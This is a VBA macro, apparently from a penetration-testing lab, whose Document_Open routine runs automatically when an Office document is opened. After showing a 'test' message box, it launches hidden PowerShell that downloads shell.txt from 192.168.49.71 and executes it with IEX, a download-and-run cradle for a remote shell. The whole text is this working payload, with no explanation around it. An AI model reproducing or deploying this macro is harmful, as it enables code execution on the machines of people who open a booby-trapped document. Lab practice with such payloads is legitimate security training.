Sub Document_Open()
    MsgBox "test"
    Dim exePath As String
    
    Dim str As String
    str = "powershell IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.49.71/shell.txt')"
    Shell str, vbHide

End Sub
